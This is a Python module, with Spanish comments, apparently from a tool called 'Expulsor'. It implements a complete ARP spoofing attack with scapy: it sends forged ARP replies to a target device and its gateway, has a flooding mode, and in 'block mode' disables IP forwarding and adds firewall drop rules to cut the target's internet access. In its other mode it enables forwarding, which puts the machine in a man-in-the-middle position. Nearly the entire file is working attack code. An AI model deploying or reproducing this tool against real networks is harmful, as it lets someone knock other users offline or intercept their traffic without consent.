"""
Módulo de ARP Spoofing para Expulsor - Versión mejorada
Este módulo implementa técnicas efectivas de ARP Spoofing para restricción de acceso a red
"""

import threading
import time
import subprocess
import platform
from typing import Callable, Optional, Dict, List, Tuple

from scapy.all import ARP, Ether, send, srp


class ARPSpoofer:
    """Implementa funcionalidad avanzada de ARP Spoofing para restringir el acceso a internet de dispositivos"""
    
    def __init__(self, gateway_ip: str, gateway_mac: str, local_mac: str):
        """
        Inicializa el ARP Spoofer
        
        Args:
            gateway_ip: IP de la puerta de enlace
            gateway_mac: MAC de la puerta de enlace
            local_mac: MAC de este dispositivo
        """
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.local_mac = local_mac
        self.targets = {}  # {ip: {'mac': mac, 'thread': thread, 'running': bool, 'flooding': bool}}
        self.status_callback = None
        self.ip_forward_original_state = None
        self.packet_rate = 0.5  # Intervalo más corto entre paquetes (0.5 segundos)
        self.aggressive_mode = True  # Modo agresivo activado por defecto
        self.block_mode = True  # Modo de bloqueo real activado por defecto
    
    def set_status_callback(self, callback: Callable[[str, str, bool], None]):
        """
        Establece un callback para informar sobre cambios de estado
        
        Args:
            callback: Función que se llamará con (ip, mensaje, éxito)
        """
        self.status_callback = callback
    
    def set_packet_rate(self, rate: float):
        """
        Establece la frecuencia de envío de paquetes ARP
        
        Args:
            rate: Intervalo en segundos entre envíos de paquetes
        """
        if rate < 0.1:
            rate = 0.1  # Límite mínimo para evitar sobrecarga
        elif rate > 5:
            rate = 5  # Límite máximo
        self.packet_rate = rate
    
    def set_aggressive_mode(self, enabled: bool):
        """
        Activa o desactiva el modo agresivo de bloqueo
        
        Args:
            enabled: True para activar el modo agresivo
        """
        self.aggressive_mode = enabled
    
    def set_block_mode(self, enabled: bool):
        """
        Activa o desactiva el modo de bloqueo real
        
        Args:
            enabled: True para activar el bloqueo real de tráfico
        """
        self.block_mode = enabled
    
    def _get_mac(self, ip: str) -> Optional[str]:
        """Obtiene la dirección MAC de un dispositivo dada su IP"""
        try:
            # Intentar múltiples veces para mejorar la fiabilidad
            for _ in range(3):
                arp_request = ARP(pdst=ip)
                broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
                packet = broadcast / arp_request
                answered, _ = srp(packet, timeout=2, verbose=0, retry=3)
                
                if answered:
                    return answered[0][1].hwsrc
                time.sleep(0.5)
        except Exception as e:
            self._report_status(ip, f"Error al obtener MAC: {e}", False)
        return None
    
    def _report_status(self, ip: str, message: str, success: bool = True):
        """Informa sobre el estado mediante el callback si está configurado"""
        if self.status_callback:
            self.status_callback(ip, message, success)
        else:
            print(f"[{'✓' if success else '✗'}] {ip}: {message}")
    
    def _enable_ip_forwarding(self) -> bool:
        """
        Habilita el reenvío de IP para que los paquetes sean reenviados
        Retorna True si se pudo habilitar correctamente
        """
        try:
            system = platform.system()
            if system == "Linux":
                # Guardar el estado original
                with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
                    self.ip_forward_original_state = f.read().strip()
                # Habilitar IP forwarding
                cmd = "echo 1 > /proc/sys/net/ipv4/ip_forward"
                subprocess.run(cmd, shell=True, check=True)
                return True
            elif system == "Darwin":  # macOS
                # Guardar el estado original
                result = subprocess.run(["sysctl", "net.inet.ip.forwarding"], capture_output=True, text=True)
                self.ip_forward_original_state = result.stdout.strip().split(":")[-1].strip()
                # Habilitar IP forwarding
                subprocess.run(["sysctl", "-w", "net.inet.ip.forwarding=1"], check=True)
                return True
            elif system == "Windows":
                # En Windows, esto requiere modificar el registro
                # Por simplicidad, aquí solo informamos
                self._report_status("system", "IP forwarding no es necesario en Windows para ARP Spoofing", True)
                return True
        except Exception as e:
            self._report_status("system", f"Error al habilitar IP forwarding: {e}", False)
        return False
    
    def _disable_ip_forwarding(self) -> bool:
        """
        Deshabilita el reenvío de IP para bloquear el tráfico
        Retorna True si se pudo deshabilitar correctamente
        """
        try:
            system = platform.system()
            if system == "Linux":
                # Guardar el estado original si no se ha hecho ya
                if self.ip_forward_original_state is None:
                    with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
                        self.ip_forward_original_state = f.read().strip()
                # Deshabilitar IP forwarding
                cmd = "echo 0 > /proc/sys/net/ipv4/ip_forward"
                subprocess.run(cmd, shell=True, check=True)
                self._report_status("system", "IP forwarding deshabilitado para bloquear tráfico", True)
                return True
            elif system == "Darwin":  # macOS
                # Guardar el estado original
                if self.ip_forward_original_state is None:
                    result = subprocess.run(["sysctl", "net.inet.ip.forwarding"], capture_output=True, text=True)
                    self.ip_forward_original_state = result.stdout.strip().split(":")[-1].strip()
                # Deshabilitar IP forwarding
                subprocess.run(["sysctl", "-w", "net.inet.ip.forwarding=0"], check=True)
                self._report_status("system", "IP forwarding deshabilitado para bloquear tráfico", True)
                return True
            elif system == "Windows":
                # En Windows, necesitamos otro enfoque
                self._report_status("system", "La gestión de IP forwarding no está implementada para Windows", False)
                return False
        except Exception as e:
            self._report_status("system", f"Error al deshabilitar IP forwarding: {e}", False)
        return False
    
    def _setup_firewall_rules(self, target_ip: str) -> bool:
        """
        Configura reglas de firewall para descartar paquetes del IP objetivo
        Retorna True si se configuró correctamente
        """
        try:
            system = platform.system()
            if system == "Linux":
                # Usar iptables para descartar paquetes del IP objetivo
                cmd = f"iptables -A FORWARD -s {target_ip} -j DROP"
                subprocess.run(cmd, shell=True, check=True)
                self._report_status("system", f"Regla de firewall agregada para bloquear {target_ip}", True)
                return True
            elif system == "Darwin":  # macOS
                # Usar pfctl para macOS (simplificado)
                cmd = f"echo 'block drop from {target_ip} to any' | sudo pfctl -ef -"
                subprocess.run(cmd, shell=True, check=True)
                self._report_status("system", f"Regla de firewall agregada para bloquear {target_ip}", True)
                return True
            elif system == "Windows":
                # Usar netsh para Windows (simplificado)
                cmd = f'netsh advfirewall firewall add rule name="Block {target_ip}" dir=out action=block remoteip={target_ip}'
                subprocess.run(cmd, shell=True, check=True)
                self._report_status("system", f"Regla de firewall agregada para bloquear {target_ip}", True)
                return True
        except Exception as e:
            self._report_status("system", f"Error al configurar reglas de firewall: {e}", False)
        return False
    
    def _remove_firewall_rules(self, target_ip: str):
        """Elimina las reglas de firewall para el IP objetivo"""
        try:
            system = platform.system()
            if system == "Linux":
                cmd = f"iptables -D FORWARD -s {target_ip} -j DROP"
                subprocess.run(cmd, shell=True, check=True)
            elif system == "Darwin":  # macOS
                # Para macOS, esto requeriría una gestión más compleja de pfctl
                pass
            elif system == "Windows":
                cmd = f'netsh advfirewall firewall delete rule name="Block {target_ip}"'
                subprocess.run(cmd, shell=True, check=True)
            self._report_status("system", f"Regla de firewall eliminada para {target_ip}", True)
        except Exception as e:
            self._report_status("system", f"Error al eliminar reglas de firewall: {e}", False)
    
    def _restore_ip_forwarding(self):
        """Restaura la configuración original de reenvío de IP"""
        if self.ip_forward_original_state is None:
            return
        
        try:
            system = platform.system()
            if system == "Linux":
                cmd = f"echo {self.ip_forward_original_state} > /proc/sys/net/ipv4/ip_forward"
                subprocess.run(cmd, shell=True, check=True)
            elif system == "Darwin":  # macOS
                subprocess.run(["sysctl", "-w", f"net.inet.ip.forwarding={self.ip_forward_original_state}"], check=True)
            self._report_status("system", "Configuración de IP forwarding restaurada", True)
        except Exception as e:
            self._report_status("system", f"Error al restaurar IP forwarding: {e}", False)
    
    def _create_flood_packets(self, target_ip: str, target_mac: str, count: int = 20) -> List[Tuple[ARP, ARP]]:
        """
        Crea múltiples pares de paquetes ARP para flooding
        
        Args:
            target_ip: IP del objetivo
            target_mac: MAC del objetivo
            count: Número de pares de paquetes a generar
        
        Returns:
            Lista de tuplas (paquete_objetivo, paquete_gateway)
        """
        packets = []
        
        for _ in range(count):
            # Paquete para el objetivo
            target_packet = ARP(
                op=2,  # ARP Reply
                pdst=target_ip,
                hwdst=target_mac,
                psrc=self.gateway_ip,
                hwsrc=self.local_mac
            )
            
            # Paquete para la puerta de enlace
            # Usamos broadcast para asegurar que llegue
            gateway_packet = ARP(
                op=2,  # ARP Reply
                pdst=self.gateway_ip,
                hwdst="ff:ff:ff:ff:ff:ff",  # Broadcast para mayor efectividad
                psrc=target_ip,
                hwsrc=self.local_mac
            )
            
            packets.append((target_packet, gateway_packet))
        
        return packets
    
    def _flood_target(self, target_ip: str, target_mac: str):
        """
        Realiza un flooding inicial de paquetes ARP para establecer el spoofing rápidamente
        """
        if not self.aggressive_mode:
            return
            
        self._report_status(target_ip, "Iniciando flooding ARP para establecer bloqueo rápido")
        
        # Crear múltiples paquetes con pequeñas variaciones para evitar filtrado
        packet_pairs = self._create_flood_packets(target_ip, target_mac)
        
        # Enviar todos los paquetes rápidamente
        for target_packet, gateway_packet in packet_pairs:
            send(target_packet, verbose=0)
            send(gateway_packet, verbose=0)
            time.sleep(0.02)  # Pequeña pausa para no saturar
    
    def _spoof_target(self, target_ip: str, target_mac: str):
        """Método interno que se ejecuta en un hilo para el spoofing de un objetivo, adaptado del script"""
        target_info = self.targets.get(target_ip)
        if not target_info:
            return
        
        try:
            self._report_status(target_ip, f"Iniciando restricción de acceso para {target_ip} (MAC: {target_mac})")

            # 1. Paquete ARP para el objetivo: Decirle que la IP de la puerta de enlace tiene nuestra MAC
            respuesta_arp_objetivo = ARP(
                pdst=target_ip,            # IP Destino: Objetivo
                hwdst=target_mac,          # MAC Destino: Objetivo
                psrc=self.gateway_ip,      # IP Origen: Puerta de enlace (engañosa)
                hwsrc=self.local_mac,      # MAC Origen: Nuestra MAC
                op=2                       # op=2 (ARP Reply)
            )

            # 2. Paquete ARP para la puerta de enlace: Decirle que la IP del objetivo tiene nuestra MAC
            # Usar MAC de broadcast para la puerta de enlace para mayor fiabilidad
            respuesta_arp_puerta = ARP(
                pdst=self.gateway_ip,      # IP Destino: Puerta de enlace
                hwdst="ff:ff:ff:ff:ff:ff", # MAC Destino: Broadcast (o self.gateway_mac si se prefiere)
                psrc=target_ip,            # IP Origen: Objetivo (engañosa)
                hwsrc=self.local_mac,      # MAC Origen: Nuestra MAC
                op=2                       # op=2 (ARP Reply)
            )

            start_time = time.time()
            packet_count = 0

            while self.targets.get(target_ip, {}).get('running', False):
                try:
                    send(respuesta_arp_objetivo, verbose=0)
                    send(respuesta_arp_puerta, verbose=0)
                    packet_count += 2

                    # Log periódico (opcional, adaptado de la lógica original)
                    elapsed = time.time() - start_time
                    if elapsed > 30:
                        self._report_status(
                            target_ip,
                            f"ARP Spoofing activo. {packet_count} paquetes enviados en {int(elapsed)} segundos."
                        )
                        start_time = time.time()
                        packet_count = 0

                    time.sleep(self.packet_rate)

                except Exception as e:
                    self._report_status(target_ip, f"Error durante el envío de paquetes ARP: {e}", False)
                    time.sleep(1) # Esperar antes de reintentar

            # Al salir del bucle (cuando 'running' es False), restaurar conexión
            self._restore_connection(target_ip, target_mac)

        except Exception as e:
            self._report_status(target_ip, f"Error fatal en el hilo de spoofing: {e}", False)
            # Intentar restaurar incluso si hay un error fatal
            self._restore_connection(target_ip, target_mac)
    
    def _restore_connection(self, target_ip: str, target_mac: str):
        """Restaura la conexión normal enviando paquetes ARP correctos, adaptado del script"""
        if not self.gateway_mac or not target_mac:
             self._report_status(target_ip, "No se puede restaurar: falta MAC de gateway o objetivo.", False)
             return

        try:
            self._report_status(target_ip, "Restaurando conexión ARP...")

            # Paquete para restaurar la tabla ARP del objetivo
            respuesta_arp_objetivo_restore = ARP(
                pdst=target_ip,            # IP Destino: Objetivo
                hwdst=target_mac,          # MAC Destino: Objetivo
                psrc=self.gateway_ip,      # IP Origen: Puerta de enlace (Correcta)
                hwsrc=self.gateway_mac,    # MAC Origen: Puerta de enlace (Correcta)
                op=2                       # op=2 (ARP Reply)
            )

            # Paquete para restaurar la tabla ARP de la puerta de enlace
            respuesta_arp_puerta_restore = ARP(
                pdst=self.gateway_ip,      # IP Destino: Puerta de enlace
                hwdst=self.gateway_mac,    # MAC Destino: Puerta de enlace (Correcta)
                psrc=target_ip,            # IP Origen: Objetivo (Correcta)
                hwsrc=target_mac,          # MAC Origen: Objetivo (Correcta)
                op=2                       # op=2 (ARP Reply)
            )

            # Enviar los paquetes de restauración varias veces para asegurar
            self._report_status(target_ip, "Enviando paquetes ARP de restauración...")
            for _ in range(5): # Enviar 5 veces como en el script
                send(respuesta_arp_objetivo_restore, count=1, verbose=0) # count=1 ya que está en loop
                send(respuesta_arp_puerta_restore, count=1, verbose=0)
                time.sleep(0.2) # Pequeña pausa entre envíos

            self._report_status(target_ip, "Paquetes de restauración enviados.")

        except Exception as e:
            self._report_status(target_ip, f"Error al enviar paquetes de restauración: {e}", False)
    
    def _verify_blocking(self, target_ip: str):
        """Verifica que el bloqueo está funcionando para el IP objetivo"""
        # Esperar un poco para que el spoofing tenga efecto
        time.sleep(5)
        
        # Solo continuar si aún está activo
        if not (target_ip in self.targets and self.targets[target_ip].get('running', False)):
            return
        
        # Intentar hacer ping al objetivo para ver si está alcanzable
        try:
            system = platform.system()
            ping_param = "-n 1" if system == "Windows" else "-c 1"
            cmd = f"ping {ping_param} {target_ip}"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            # Verificar si el ping fue exitoso
            ping_success = "ttl=" in result.stdout.lower() or "time=" in result.stdout.lower()
            
            if ping_success:
                self._report_status(
                    target_ip, 
                    "Verificación: El dispositivo sigue siendo accesible localmente (normal)."
                )
                
                # Intentar verificar si el dispositivo bloqueado puede acceder a internet
                # Este método es aproximado y puede no ser 100% preciso
                self._report_status(
                    target_ip, 
                    "El dispositivo objetivo debería tener su acceso a internet bloqueado. " + 
                    "Verifique en el dispositivo si puede navegar por internet."
                )
            else:
                self._report_status(
                    target_ip, 
                    "Verificación: No se puede hacer ping al dispositivo. Esto podría significar " + 
                    "que el bloqueo es muy efectivo o que el dispositivo está apagado."
                )
                
        except Exception as e:
            self._report_status(target_ip, f"Error al verificar el bloqueo: {e}", False)
    
    def start_spoofing(self, target_ip: str) -> bool:
        """
        Inicia el ARP Spoofing para un objetivo
        
        Args:
            target_ip: IP del dispositivo objetivo
        
        Returns:
            bool: True si se inició correctamente, False en caso contrario
        """
        # Verificar si ya está activo
        if target_ip in self.targets and self.targets[target_ip].get('running', False):
            self._report_status(target_ip, "La restricción ya está activa", True)
            return True
        
        # Configurar el reenvío de IP según el modo de bloqueo
        if self.block_mode:
            # Para bloqueo real, necesitamos DESHABILITAR el reenvío de IP
            self._disable_ip_forwarding()
            # Y configurar reglas de firewall
            self._setup_firewall_rules(target_ip)
        else:
            # Para modo de monitorización (sin bloqueo), habilitar reenvío de IP
            self._enable_ip_forwarding()
        
        # Obtener MAC del objetivo
        target_mac = self._get_mac(target_ip)
        if not target_mac:
            self._report_status(target_ip, "No se pudo obtener la MAC del objetivo", False)
            return False
        
        # Iniciar el hilo de spoofing
        spoof_thread = threading.Thread(
            target=self._spoof_target,
            args=(target_ip, target_mac),
            daemon=True
        )
        
        # Registrar el objetivo
        self.targets[target_ip] = {
            'mac': target_mac,
            'thread': spoof_thread,
            'running': True,
            'start_time': time.time(),
            'block_mode': self.block_mode  # Guardar modo de bloqueo actual para este objetivo
        }
        
        # Iniciar el hilo
        spoof_thread.start()
        
        # Verificar bloqueo si estamos en modo de bloqueo real
        if self.block_mode:
            # Programar verificación después de un breve retraso
            verification_thread = threading.Thread(
                target=self._verify_blocking,
                args=(target_ip,),
                daemon=True
            )
            verification_thread.start()
        
        self._report_status(target_ip, f"Restricción de acceso iniciada correctamente. MAC objetivo: {target_mac}")
        return True
    
    def stop_spoofing(self, target_ip: str) -> bool:
        """
        Detiene el ARP Spoofing para un objetivo
        
        Args:
            target_ip: IP del dispositivo objetivo
        
        Returns:
            bool: True si se detuvo correctamente, False en caso contrario
        """
        if target_ip not in self.targets:
            self._report_status(target_ip, "El objetivo no está siendo restringido", False)
            return False
        
        # Verificar si este objetivo estaba en modo de bloqueo
        block_mode = self.targets[target_ip].get('block_mode', False)
        
        # Marcar para detener
        self.targets[target_ip]['running'] = False
        
        # Esperar a que termine (con timeout)
        if self.targets[target_ip]['thread'].is_alive():
            self.targets[target_ip]['thread'].join(timeout=5)
        
        # Eliminar de la lista
        target_info = self.targets.pop(target_ip, None)
        
        # Si estaba en modo de bloqueo, eliminar reglas de firewall
        if block_mode:
            self._remove_firewall_rules(target_ip)
        
        # Si no se restauró por alguna razón, intentar restaurar manualmente
        if target_info and 'mac' in target_info:
            self._restore_connection(target_ip, target_info['mac'])
        
        # Si no quedan objetivos activos, restaurar reenvío de IP
        if not any(t.get('running', False) for t in self.targets.values()):
            self._restore_ip_forwarding()
        
        self._report_status(target_ip, "Restricción de acceso detenida correctamente")
        return True
    
    def is_spoofing(self, target_ip: str) -> bool:
        """
        Verifica si un objetivo está siendo spoofed
        
        Args:
            target_ip: IP del dispositivo objetivo
        
        Returns:
            bool: True si está activo, False en caso contrario
        """
        return target_ip in self.targets and self.targets[target_ip].get('running', False)
    
    def get_all_targets(self) -> Dict[str, Dict]:
        """
        Obtiene todos los objetivos que están siendo spoofed
        
        Returns:
            dict: {ip: info} de todos los objetivos activos
        """
        return {ip: {
            'mac': info['mac'],
            'duration': time.time() - info.get('start_time', time.time()),
            'active': info.get('running', False),
            'block_mode': info.get('block_mode', False)
        } for ip, info in self.targets.items() if info.get('running', False)}
    
    def stop_all(self):
        """Detiene todos los ataques ARP Spoofing activos"""
        for ip in list(self.targets.keys()):
            self.stop_spoofing(ip)
        
        # Asegurar restauración de IP forwarding
        self._restore_ip_forwarding()